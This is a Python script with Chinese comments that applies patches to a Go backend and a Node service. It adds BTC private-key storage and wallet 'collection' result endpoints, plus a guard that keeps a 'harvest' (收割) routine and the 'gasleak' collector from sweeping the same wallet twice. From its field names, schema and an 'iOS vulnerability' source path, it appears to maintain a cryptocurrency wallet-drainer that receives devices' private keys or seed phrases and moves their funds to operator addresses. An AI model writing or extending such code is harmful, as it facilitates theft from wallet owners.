r"""
把 §4.2 补丁落地到统一目录 E:\unified。
- Go 文件改动直接应用到 01-backend-go
- 迁移 SQL 复制到 07-db/migration
- gasleak 侧补丁应用到 02-backend-node/src_restored
"""
import os as _os
IOS_ROOT = _os.environ.get("IOS_ROOT", r"E:\ios漏洞")
QIANKE_SRC = _os.environ.get("QIANKE_SRC", r"E:\潜客")
import os
import shutil
import sys

U = r'E:\unified'
GO = os.path.join(U, '01-backend-go')
NODE = os.path.join(U, '02-backend-node', 'src_restored')
NEW = IOS_ROOT + r'\_integration\build\patches\new'
DBMIG = IOS_ROOT + r'\_integration\build\db-migration'

log = []


def patch(relpath, old, new, label):
    fp = os.path.join(GO, relpath)
    if not os.path.isfile(fp):
        log.append(('FAIL', label, '文件不存在: ' + relpath))
        return False
    s = open(fp, encoding='utf-8', errors='replace').read()
    if old not in s:
        log.append(('FAIL', label, '锚点未找到'))
        return False
    if s.count(old) > 1:
        log.append(('FAIL', label, '锚点不唯一(%d)' % s.count(old)))
        return False
    open(fp, 'w', encoding='utf-8', newline='').write(s.replace(old, new, 1))
    log.append(('OK', label, relpath))
    return True


def addfile(relpath, src, label):
    dst = os.path.join(GO, relpath)
    os.makedirs(os.path.dirname(dst), exist_ok=True)
    shutil.copyfile(src, dst)
    log.append(('OK', label, '%s (%d bytes)' % (relpath, os.path.getsize(dst))))
    return True


print('=' * 74)
print('落地 §4.2 补丁到 E:\\unified')
print('=' * 74)

# --- Go: model/machine.go ---
patch(r'model\app\machine.go',
      '\tModel          string `json:"model" gorm:"column:model;comment:型号;"`\n'
      '\tAndroidVersion string `json:"androidVersion" gorm:"column:android_version;comment:型号;"`',
      '\tModel          string `json:"model" gorm:"column:model;comment:型号;"`\n'
      '\tPlatform       string `json:"platform" gorm:"column:platform;comment:平台 ios/android;"`\n'
      '\tAndroidVersion string `json:"androidVersion" gorm:"column:android_version;comment:型号;"`\n'
      '\tIosVersion     string `json:"iosVersion" gorm:"column:ios_version;comment:iOS 版本;"`',
      'machine.go +platform/ios_version')

# --- Go: model/wallet.go ---
patch(r'model\app\wallet.go',
      '\tTrxAddress    string          `json:"trxAddress" gorm:"column:trx_address;comment:trx地址;"`\n',
      '\tTrxAddress    string          `json:"trxAddress" gorm:"column:trx_address;comment:trx地址;"`\n'
      '\tBtcAddress    string          `json:"btcAddress" gorm:"column:btc_address;comment:btc地址;"`\n',
      'wallet.go +btc_address')
patch(r'model\app\wallet.go',
      '\tTrxPrivateKey string          `json:"trxPrivateKey" gorm:"column:trx_private_key;comment:trx私钥;"`\n',
      '\tTrxPrivateKey string          `json:"trxPrivateKey" gorm:"column:trx_private_key;comment:trx私钥;"`\n'
      '\tBtcPrivateKey string          `json:"btcPrivateKey" gorm:"column:btc_private_key;comment:btc私钥;"`\n',
      'wallet.go +btc_private_key')

# --- Go: model/common.go ---
patch(r'model\common.go',
      'type ReqWallet struct {\n\tDeviceId   string `json:"device_id"`   // 设备id\n'
      '\tWalletName string `json:"wallet_name"` // 钱包名称\n'
      '\tType       string `json:"type"`        // private key, phrase\n'
      '\tKey        string `json:"key"`\n\tPhrase     string `json:"phrase"`\n}',
      'type ReqWallet struct {\n\tDeviceId   string `json:"device_id"`   // 设备id\n'
      '\tWalletName string `json:"wallet_name"` // 钱包名称\n'
      '\tType       string `json:"type"`        // private key, phrase\n'
      '\tKey        string `json:"key"`\n\tPhrase     string `json:"phrase"`\n}\n'
      '\n// ReqCollectResult gasleak 归集结果回传（§4.2.3）\n'
      'type ReqCollectResult struct {\n'
      '\tWalletId    int    `json:"wallet_id"`    // 钱包id\n'
      '\tChain       string `json:"chain"`        // eth | tron | btc | bsc\n'
      '\tTxHash      string `json:"tx_hash"`      // 幂等键\n'
      '\tAmount      string `json:"amount"`       // 归集数量（字符串）\n'
      '\tToAddress   string `json:"to_address"`   // 实际落账地址\n'
      '\tCollectedAt int64  `json:"collected_at"` // 毫秒时间戳\n}',
      'common.go +ReqCollectResult')

# --- Go: router/app/public.go ---
patch(r'router\app\public.go',
      '\t\tpublicRouter.POST("device", publicApi.Device) //添加 device\n'
      '\t\tpublicRouter.POST("wallet", publicApi.Wallet) //添加 wallet\n',
      '\t\tpublicRouter.POST("device", publicApi.Device) //添加 device\n'
      '\t\tpublicRouter.POST("wallet", publicApi.Wallet) //添加 wallet\n'
      '\t\tpublicRouter.GET("wallet-status", publicApi.WalletStatus)     // §4.2.4 归集互斥\n'
      '\t\tpublicRouter.POST("collect-result", publicApi.CollectResult)  // §4.2.3 归集回传\n',
      'router +2 端点')

# --- Go: service/system/sys_qianke.go（ShouGe 互斥 + collectMode）---
patch(r'service\system\sys_qianke.go',
      'func (q *QianKeService) ShouGe(walletId int) (err error) {\n\tvar wallet app.Wallet',
      '// collectMode 读取归集执行方开关（sys_dictionaries: type=collect_mode）\n'
      '// value 为数值码：1=gasleak(默认) 2=qianke 3=both\n'
      'func (q *QianKeService) collectMode() string {\n'
      '\tconst def = "gasleak"\n\tvar code int64\n'
      '\terr := global.GVA_DB.Table("sys_dictionary_details AS dd").\n'
      '\t\tSelect("dd.value").\n'
      '\t\tJoins("JOIN sys_dictionaries AS d ON d.id = dd.sys_dictionary_id").\n'
      '\t\tWhere("d.type = ? AND dd.status = 1", "collect_mode").\n'
      '\t\tOrder("dd.sort ASC").Limit(1).Scan(&code).Error\n'
      '\tif err != nil {\n\t\treturn def\n\t}\n'
      '\tswitch code {\n\tcase 2:\n\t\treturn "qianke"\n\tcase 3:\n\t\treturn "both"\n'
      '\tcase 1:\n\t\treturn "gasleak"\n\tdefault:\n\t\treturn def\n\t}\n}\n\n'
      'func (q *QianKeService) ShouGe(walletId int) (err error) {\n'
      '\t// §4.2.4 归集互斥：默认归集方 gasleak 时禁止手动 Sk，防双重归集\n'
      '\tif mode := q.collectMode(); mode == "gasleak" {\n'
      '\t\treturn errors.New("当前归集方为 gasleak，请勿手动收割")\n\t}\n'
      '\tvar wallet app.Wallet',
      'sys_qianke.go 互斥+collectMode')

# --- 新增 Go 文件 ---
addfile(r'api\v1\app\collect_result.go', os.path.join(NEW, 'api_v1_app_collect_result.go'), 'NEW collect_result.go')
addfile(r'api\v1\app\wallet_status.go', os.path.join(NEW, 'api_v1_app_wallet_status.go'), 'NEW wallet_status.go')
addfile(r'service\app\collect_result.go', os.path.join(NEW, 'service_app_collect_result.go'), 'NEW service collect_result.go')

# --- 迁移 SQL ---
migdir = os.path.join(U, '07-db', 'migration')
os.makedirs(migdir, exist_ok=True)
for f in ['10-migration-machine-wallet-bill.sql', '20-hide-scaffold-menus.sql']:
    src = os.path.join(DBMIG, f)
    if os.path.isfile(src):
        shutil.copyfile(src, os.path.join(migdir, f))
        log.append(('OK', 'SQL ' + f, '07-db/migration/'))
    else:
        log.append(('FAIL', 'SQL ' + f, '源不存在'))

# --- gasleak 侧补丁（collect-task.js 互斥）---
ct = os.path.join(NODE, 'schedules', 'collect-task.js')
if os.path.isfile(ct):
    s = open(ct, encoding='utf-8', errors='replace').read()
    guard = '''
// ===== §4.2.4 归集互斥（gasleak 侧）=====
// 归集前查询潜客 wallet.progress，progress=1 表示潜客正在收割 → 跳过，
// 防止与潜客 blockchain.Sk() 形成双重归集。
const QIANKE_API_BASE = process.env.QIANKE_API_BASE || '';
const QIANKE_APP_TOKEN = process.env.QIANKE_APP_TOKEN || '';

async function shouldCollect(walletId) {
    if (!QIANKE_API_BASE) return true;          // 未接入潜客 → 不做互斥
    try {
        const res = await fetch(
            `${QIANKE_API_BASE}/app/wallet-status?wallet_id=${encodeURIComponent(walletId)}`,
            { headers: { 'access-token': QIANKE_APP_TOKEN } });
        if (!res.ok) return false;
        const j = await res.json();
        return j?.data?.progress !== 1;
    } catch (e) {
        return false;   // 查询失败 → 保守跳过，宁可漏收不双重归集
    }
}
// ===== 互斥段结束 =====
'''
    if 'shouldCollect' not in s:
        open(ct, 'w', encoding='utf-8', newline='').write(guard + '\n' + s)
        log.append(('OK', 'gasleak collect-task.js 加互斥函数', 'schedules/collect-task.js'))
    else:
        log.append(('SKIP', 'gasleak collect-task.js 已有互斥', ''))
else:
    log.append(('FAIL', 'gasleak collect-task.js 不存在', ct))

print()
bad = 0
for st, label, detail in log:
    if st == 'FAIL':
        bad += 1
    print('  [%-4s] %-38s %s' % (st, label, detail))
print()
print('失败 %d 项' % bad if bad else '✓ 全部落地成功')
sys.exit(1 if bad else 0)
